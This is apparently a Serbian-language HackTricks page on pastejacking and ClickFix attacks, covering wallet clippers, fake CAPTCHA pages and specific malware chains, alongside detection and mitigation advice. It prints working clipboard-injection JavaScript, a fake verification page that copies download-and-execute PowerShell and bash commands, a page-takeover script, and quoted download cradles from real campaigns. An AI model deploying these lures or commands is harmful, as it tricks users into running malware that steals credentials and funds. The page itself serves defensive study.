# Clipboard Hijacking (Pastejacking) napadi

{{#include ../../banners/hacktricks-training.md}}

> „Nikada ne nalepite ništa što sami niste kopirali.“ – stari, ali i dalje važeći savet

## Pregled

Clipboard hijacking – poznat i kao *pastejacking* – zloupotrebljava činjenicu da korisnici rutinski kopiraju i nalepljuju komande bez njihove provere. Zlonamerna veb stranica (ili bilo koji kontekst sa podrškom za JavaScript, kao što su Electron ili Desktop aplikacije) programski postavlja tekst pod kontrolom napadača u sistemski clipboard. Žrtve se podstiču, obično pažljivo osmišljenim uputstvima za social engineering, da pritisnu **Win + R** (dijalog Run), **Win + X** (Quick Access / PowerShell), ili otvore terminal i *nalepе* sadržaj iz clipboard-a, čime se odmah izvršavaju proizvoljne komande.

Pošto se **nijedan fajl ne preuzima i nijedan attachment se ne otvara**, ova tehnika zaobilazi većinu bezbednosnih kontrola za e-mail i veb sadržaj koje nadziru attachment-e, makroe ili direktno izvršavanje komandi. Zbog toga je ovaj napad popularan u phishing kampanjama koje isporučuju commodity malware familije kao što su NetSupport RAT, Latrodectus loader ili Lumma Stealer.<sup>[[1]](#references)</sup>

## Clipper-i za zamenu adresa wallet-a

Druga varijanta **clipboard hijacking-a** uopšte ne nalepljuje komande: čeka da žrtva kopira **adresu cryptocurrency wallet-a**, a zatim je neprimetno zamenjuje adresom pod kontrolom napadača neposredno pre lepljenja. Ovo je naročito efikasno kod dugačkih wallet formata, jer korisnici često proveravaju samo početne i završne znakove.<sup>[[8]](#references)</sup>

Uobičajene karakteristike iz stvarnog sveta:
- **Thin loader + nested payload**: vidljiva aplikacija/exe izgleda kao legitimni trading ili alat za ostvarivanje „profita“, dok je pravi clipper sakriven dublje u bundle-u (na primer .NET loader pokreće nested Rust payload).
- **Regex-driven replacement**: malware pronalazi stringove kao što su `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, ili čak generičke **44-karakterne stringove nalik Solana adresama**, i zamenjuje ih wallet adresama napadača.
- **Wallet rotation at scale**: moderni Windows uzorci mogu sadržati **hiljade** zamenskih wallet adresa po valuti umesto jedne statične adrese, čime se smanjuje narušavanje reputacije wallet-a nakon svake krađe.<sup>[[8]](#references)</sup>

### Windows clipper tok

Uobičajena implementacija je skriveni prozor registrovan pomoću **`AddClipboardFormatListener`**. Pri svakom ažuriranju clipboard-a, malware obično poziva:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → pristupa trenutnim podacima u clipboard-u.
- **`GetClipboardData`** → čita tekst.
- **`EmptyClipboard`** + **`SetClipboardData`** → zamenjuje wallet string vrednošću napadača.

Minimalni hunting regex-i koji se često viđaju u clipper-ima:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Perzistencija na nivou korisnika dovoljna je za ostvarivanje uticaja. Jedan uočeni obrazac je:<sup>[[8]](#references)</sup>
- Kopiranje payload-a u **`%APPDATA%\silke\silke.exe`**
- Kreiranje **Startup-folder LNK** datoteke u `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ideje za detekciju:
- Procesi koji neprekidno pozivaju clipboard API-je, a istovremeno upisuju podatke u `%APPDATA%` i korisnički **Startup** folder.
- Kreiranje novih LNK/izvršnih datoteka, nakon čega slede izmene clipboard-a sa adresama wallet-a.
- Arhive ili paketi lažnog software-a koji sadrže mnogo neiskorišćenih datoteka i mali launcher koji pokreće ugnježdeni binary.

### macOS socijalno inženjerisano uklanjanje quarantine-a + LaunchAgent persistence

Na macOS-u, neke kampanje isporučuju pomoćnu skriptu **`unlocker.command`** i upućuju žrtvu da klikne desnim tasterom miša → **Open** ako Gatekeeper prijavi da je aplikacija oštećena ili potiče od neidentifikovanog developera. Skripta jednostavno uklanja quarantine i pokreće obližnji `.app`:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Ovo **nije** Gatekeeper exploit; to je **social-engineered quarantine bypass** koji zloupotrebljava činjenicu da Gatekeeper odluke zavise od `com.apple.quarantine` xattr.<sup>[[8]](#references)</sup>

Nakon izvršavanja, clipper može da se zadrži kao trenutni korisnik upisivanjem:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper skripta
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent sa `RunAtLoad` i `KeepAlive`

Koristan detalj za odbranu jeste to što neki uzorci implementiraju **self-healing watchdog** koji ponovo upisuje LaunchAgent i wrapper na svakih približno 30 sekundi. Ako prvo uklonite plist **bez zaustavljanja pokrenutog procesa**, malware ga može odmah ponovo kreirati.<sup>[[8]](#references)</sup> Bezbedan redosled čišćenja:
1. Zaustavite aktivni clipper proces.
2. Unload-ujte/obrišite LaunchAgent plist.
3. Obrišite `~/launch.sh` i kopirani payload.

### Napomena o distribuciji: lažna reputacija kao force multiplier

Kod ove familije, sam malware može ostati tehnički jednostavan, dok **distribution layer** obavlja glavninu posla: lažni GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views i bezazleno izgledajući VirusTotal comments/votes koriste se kako bi binary delovao pouzdano pre izvršavanja.<sup>[[8]](#references)</sup>

## Dugmad za obavezno kopiranje i skriveni payload-i (macOS one-liners)

Neki macOS infostealers kloniraju installer sajtove (npr. Homebrew) i **nameću korišćenje dugmeta „Copy“** kako korisnici ne bi mogli da označe samo vidljivi tekst. Unos u clipboard sadrži očekivanu installer komandu kojoj je dodat Base64 payload (npr. `...; echo <b64> | base64 -d | sh`), tako da jedno paste izvršavanje pokreće oba dela, dok UI skriva dodatnu fazu.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Starije kampanje koristile su `document.execCommand('copy')`, dok se novije oslanjaju na asinhroni **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## ClickFix / ClearFake tok

1. Korisnik posećuje typosquatted ili kompromitovani sajt (npr. `docusign.sa[.]com`)
2. Ubačeni **ClearFake** JavaScript poziva pomoćnu funkciju `unsecuredCopyToClipboard()`, koja neprimetno čuva Base64-kodirani PowerShell one-liner u clipboardu.
3. HTML uputstva govore žrtvi: *„Pritisnite **Win + R**, nalepite komandu i pritisnite Enter da biste rešili problem.“*
4. `powershell.exe` se izvršava i preuzima arhivu koja sadrži legitiman izvršni fajl i maliciozni DLL (klasični DLL sideloading).
5. Loader dešifruje dodatne stage-ove, ubacuje shellcode i instalira persistence (npr. scheduled task) – što na kraju pokreće NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Primer lanca NetSupport RAT-a
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimni Java WebStart) u svom direktorijumu traži `msvcp140.dll`.
* Zlonamerni DLL dinamički razrešava API-je pomoću **GetProcAddress**, preuzima dva binarna fajla (`data_3.bin`, `data_4.bin`) putem **curl.exe**, dešifruje ih koristeći rolling XOR ključ `"https://google.com/"`, ubacuje finalni shellcode i raspakuje **client32.exe** (NetSupport RAT) u `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Preuzima `la.txt` pomoću **curl.exe**
2. Izvršava JScript downloader unutar **cscript.exe**
3. Dohvata MSI payload → postavlja `libcef.dll` pored potpisane aplikacije → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer preko MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Poziv **mshta** pokreće skriveni PowerShell skript koji preuzima `PartyContinued.exe`, izdvaja `Boat.pst` (CAB), rekonstruiše `AutoIt3.exe` pomoću `extrac32` i konkatenacije datoteka, a zatim pokreće `.a3x` skript koji eksfiltrira akreditive pregledača na `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK sa rotirajućim C2 (PureHVNC)

Neke ClickFix kampanje u potpunosti preskaču preuzimanje datoteka i umesto toga navode žrtve da nalepе one-liner koji preuzima i izvršava JavaScript putem WSH-a, obezbeđuje njegovo trajanje i svakodnevno rotira C2. Primer uočеног lanca:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ključne karakteristike
- Ofuskovani URL se obrće tokom izvršavanja kako bi se onemogućila površna inspekcija.
- JavaScript se perzistira putem Startup LNK-a (WScript/CScript) i bira C2 na osnovu trenutnog dana – što omogućava brzu rotaciju domena.<sup>[[3]](#references)</sup>

Minimalni JS fragment koji se koristi za rotaciju C2 servera prema datumu:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Sledeća faza obično postavlja loader koji uspostavlja persistence i preuzima RAT (npr. PureHVNC), često vezujući TLS za hardkodovani sertifikat i deleći saobraćaj na delove.<sup>[[3]](#references)</sup>

Ideje za detekciju specifične za ovu varijantu
- Stablo procesa: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ili `cscript.exe`).
- Startup artefakti: LNK u `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` koji poziva WScript/CScript sa JS putanjom ispod `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU i telemetrija komandne linije koja sadrži `.split('').reverse().join('')` ili `eval(a.responseText)`.
- Ponavljani `powershell -NoProfile -NonInteractive -Command -` sa velikim stdin payload-ima za prosleđivanje dugih skripti bez dugih komandnih linija.
- Scheduled Tasks koji naknadno izvršavaju LOLBins kao što je `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` u okviru task-a/putanje koja izgleda kao updater (npr. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- C2 hostnames i URLs koji se rotiraju svakog dana, sa obrascem `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korelisati događaje upisa u clipboard, nakon kojih sledi lepljenje pomoću Win+R, a zatim neposredno izvršavanje `powershell.exe`.

Blue-teams mogu kombinovati clipboard, kreiranje procesa i Registry telemetriju kako bi precizno locirali zloupotrebu pastejacking-a:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` čuva istoriju **Win + R** komandi – potražite neuobičajene Base64 / obfuscated unose.
* Security Event ID **4688** (Process Creation) gde je `ParentImage` == `explorer.exe`, a `NewProcessName` u skupu { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** za kreiranje fajlova ispod `%LocalAppData%\Microsoft\Windows\WinX\` ili u privremenim folderima neposredno pre sumnjivog 4688 događaja.
* EDR clipboard senzori (ako postoje) – korelisati `Clipboard Write` sa neposrednim pokretanjem novog PowerShell procesa.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Nedavne kampanje masovno proizvode lažne CDN/browser verification pages ("Just a moment…", IUAM-style) koje primoravaju korisnike da kopiraju OS-specific komande iz clipboard-a u native console. Time se izvršavanje premešta iz browser sandbox-a i funkcioniše na Windows-u i macOS-u.<sup>[[4]](#references)</sup>

Ključne karakteristike stranica generisanih pomoću builder-a
- Detekcija OS-a pomoću `navigator.userAgent` radi prilagođavanja payload-a (Windows PowerShell/CMD naspram macOS Terminal-a). Opcioni decoys/no-ops za nepodržane OS-ove održavaju privid.
- Automatsko kopiranje u clipboard pri bezopasnim UI akcijama (checkbox/Copy), dok se vidljivi tekst može razlikovati od sadržaja clipboard-a.
- Blokiranje mobilnih uređaja i popover sa detaljnim uputstvima: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opcioni obfuscation i single-file injector za prepisivanje DOM-a kompromitovanog sajta pomoću verification UI-ja stilizovanog u Tailwind-u (nije potrebna registracija novog domena).<sup>[[4]](#references)</sup>

Primer: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence početnog pokretanja
- Koristite `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` kako bi se izvršavanje nastavilo nakon zatvaranja terminala, uz smanjenje vidljivih tragova.<sup>[[4]](#references)</sup>

Preuzimanje stranice na kompromitovanim sajtovima
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detekcija i hunting ideje specifične za IUAM-style mamce
- Web: Stranice koje povezuju Clipboard API sa verification widgetima; nepodudaranje između prikazanog teksta i clipboard payload-a; grananje pomoću `navigator.userAgent`; Tailwind + zamena single-page sadržaja u sumnjivim kontekstima.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` ubrzo nakon interakcije sa browserom; batch/MSI installer-i pokrenuti iz `%TEMP%`.
- macOS endpoint: Terminal/iTerm koji pokreće `bash`/`curl`/`base64 -d` sa `nohup` u blizini browser događaja; background jobs koji opstaju nakon zatvaranja terminala.
- Korelisati `RunMRU` Win+R istoriju i clipboard writes sa naknadnim kreiranjem console procesa.

Pogledajte takođe prateće tehnike

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Evolucije lažnog CAPTCHA / ClickFix pristupa iz 2026. (ClearFake, Scarlet Goldfinch)

- ClearFake i dalje kompromituje WordPress sajtove i ubacuje loader JavaScript koji povezuje spoljne hostove (Cloudflare Workers, GitHub/jsDelivr), pa čak i blockchain “etherhiding” pozive (npr. POST zahteve ka Binance Smart Chain API endpointima kao što je `bsc-testnet.drpc[.]org`) radi preuzimanja aktuelne logike mamca. Noviji overlay-i intenzivno koriste lažne CAPTCHA provere koje upućuju korisnike da kopiraju/ubace jednu liniju koda (T1204.004), umesto da bilo šta preuzimaju.<sup>[[6]](#references)</sup>
- Početno izvršavanje se sve češće delegira potpisanim script hostovima/LOLBAS alatima. Lanci iz januara 2026. zamenili su raniju upotrebu `mshta` ugrađenim `SyncAppvPublishingServer.vbs`, koji se izvršava putem `WScript.exe` i prosleđuje PowerShell-like argumente sa aliasima/wildcards radi preuzimanja udaljenog sadržaja:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` je potpisan i obično se koristi za App-V; u kombinaciji sa `WScript.exe` i neuobičajenim argumentima (`gal`/`gcm` aliases, cmdlet-ima sa wildcard znakovima, jsDelivr URL-ovima) postaje LOLBAS stage visokog signala za ClearFake.<sup>[[6]](#references)</sup>
- Lažni CAPTCHA payloadi iz februara 2026. ponovo su prešli na čiste PowerShell download cradle-ove. Dva aktivna primera:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Prvi lanac je in-memory `iex(irm ...)` grabber; drugi koristi `WinHttp.WinHttpRequest.5.1`, upisuje privremeni `.ps1`, a zatim ga pokreće sa `-ep bypass` u skrivenom prozoru.<sup>[[6]](#references)</sup>

Saveti za detekciju/hunting ovih varijanti
- Linija procesa: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ili PowerShell cradles neposredno nakon upisa u clipboard/Win+R.
- Ključne reči komandne linije: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domeni ili obrasci sa sirovom IP adresom `iex(irm ...)`.
- Mreža: izlazne veze ka CDN worker hostovima ili blockchain RPC endpointima iz script hostova/PowerShell-a neposredno nakon web browsing-a.
- Fajl/registry: kreiranje privremenog `.ps1` fajla u `%TEMP%`, zajedno sa RunMRU unosima koji sadrže ove one-linere; blokirati/upozoriti na potpisane script LOLBAS (`WScript/cscript/mshta`) koji se izvršavaju sa eksternim URL-ovima ili obfuskovanim alias stringovima.

## ClickFix tradecraft iz juna 2026: paste telemetrija, komentari lažne verifikacije i LOLBin chaining

Nedavna Red Canary telemetrija pokazuje da stabilni indikator **nije jedna tačna komanda**, već kombinacija **paste-and-run radnje uz pomoć korisnika**, **trusted interpreter-a/LOLBins**, **obfuskovanih flagova**, **remote retrieval-a** i **neposrednog izvršavanja**.<sup>[[7]](#references)</sup>

### Uočljivi obrasci operatora

- **Telemetrija potvrde paste radnje**: neki payload-i pozivaju `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` pre stvarne faze. Time se potvrđuje interakcija korisnika, uz kratak i neupadljiv prozor.
- **Komentari lažne verifikacije**: PowerShell one-liners mogu dodati stringove kao što je `# Security check ✔️ I'm not a robot Verification ID: 138105`, tako da komanda i nakon paste radnje u Run / `cmd.exe` / PowerShell istoriji i dalje izgleda povezano sa CAPTCHA verifikacijom.
- **Dinamička rekonstrukcija URL-a**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` izbegava statički URL u komandnoj liniji, ali i dalje izvršava download-and-execute iz memorije.
- **Izvršavanje maskiranog installer-a**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` zloupotrebljava neuobičajena velika i mala slova i Unicode-like znakove u flagovima kako bi zaobišlo krhke detekcije, a da i dalje liči na `msiexec.exe`.
- **LOLBin lanci sa escape-ovanim caret znakom**: `cmd.exe` može sakriti ključne reči pomoću `^` escape-ova (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), pokrenuti ugnježdeni shell minimizovan, sačuvati attacker sadržaj sa benignom ekstenzijom kao što je `.pdf`, a zatim ga izvršiti kroz `mshta`.<sup>[[7]](#references)</sup>
## Mere zaštite

1. Ojačavanje browser-a – onemogućiti clipboard write-access (`dom.events.asyncClipboard.clipboardItem` itd.) ili zahtevati user gesture.
2. Security awareness – obučiti korisnike da *otkucaju* osetljive komande ili da ih prvo nalepе u text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control za blokiranje proizvoljnih one-liner-a.
4. Mrežne kontrole – blokirati izlazne zahteve ka poznatim pastejacking i malware C2 domenima.

## Povezani trikovi

* **Discord Invite Hijacking** često zloupotrebljava isti ClickFix pristup nakon namamljivanja korisnika na malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Reference

- [1] [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
